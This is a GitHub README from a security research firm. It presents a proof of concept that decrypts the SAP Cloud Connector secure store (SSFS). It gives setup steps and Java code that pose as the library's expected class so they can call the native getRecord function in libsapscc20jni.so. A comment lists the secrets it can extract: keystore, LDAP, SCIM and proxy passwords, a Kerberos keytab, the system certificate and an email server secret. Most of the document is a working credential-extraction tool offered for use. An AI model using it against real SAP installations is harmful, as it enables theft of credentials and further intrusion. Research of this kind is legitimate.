# SAP_Cloud_Connector_SSFS_Decryption
This repository offers a Proof of Concept (PoC) for decrypting SAP Cloud Connector SSFS. The core feature of this PoC is the exploitation of an exported function - getRecord, present in the libsapscc20jni.so file. The advantage is that you can decrypt the SSFS properties values WITHOUT REVERSING THE ECRYPTION ALGORITHM.

![image](https://github.com/redrays-io/SAP_Cloud_Connector_SSFS_Decryption/assets/7976421/58d49443-f87e-46cf-a1bf-e8d9799e9e88)

To begin, you are required to download the SSFS file from the SAP Server to your personal device. As an instance, in my case, the SSFS was stored at this location on my laptop: /home/vah13/research/SSFS_SCC.DAT.
Before initiating the decryption process, it is necessary to define two parameters in the environment:

* The SAP System ID (SID). Set it with this command: export SAPSYSTEMNAME=SCC.
* The pathway to SSFS excluding the complete filename. Set it with this command: export RSEC_SSFS_DATAPATH=/home/vah13/research/SSFS.

It's important to utilize the libsapscc20jni.so library.
You can now compile and run the following code to decrypt the SSFS:
```java
package com.sap.scc.jni;  // the package must be com.sap.scc.jni

import java.io.IOException;
import java.util.Properties;

public class SecStoreAccess { // the class name must be SecStoreAccess
  
  static synchronized native char[] getRecord(final String p0) throws SecStoreAccessException, IllegalArgumentException;
  
  public static void main(String[] args) throws IOException {
    if (args.length > 1 )
    {
      System.out.print("java -jar decode.jar");
    }
    
    System.load("/usr/lib/libsapscc20jni.so");
    try
    {
      /* 
      available parameters for getRecord function
      
      "CLOUD_CONN/JAVA_KEYSTORE_PASSWORD";
      "CLOUD_CONN/SCIM_SERVICE_USER_PASSWD";
      "CLOUD_CONN/LDAP_SERVICE_USER_PASSWORD";
      "CLOUD_CONN/PROXY_PASSWORD";
      "CLOUD_CONN/KERBEROS_KTAB";
      "CLOUD_CONN/SYSTEM_CERTIFICATE";
      "CLOUD_CONN/ALERT_EMAIL_SERVER_SECRET";
      */      
      char[] result = getRecord("CLOUD_CONN/JAVA_KEYSTORE_PASSWORD");
      System.out.println(new String(result));
    
      }catch (Exception e)
    {
      e.printStackTrace();
    }
  }

}
```
![image](https://user-images.githubusercontent.com/7976421/202764294-14d66338-b94f-4825-8fec-cb673f46e15c.png)


## Contact RedRays

For any questions or further details, don't hesitate to reach out:

* [GitHub](https://github.com/redrays-io)
* [Email](mailto:vahagn@redrays.io)
* [Website](https://www.redrays.io?gh)
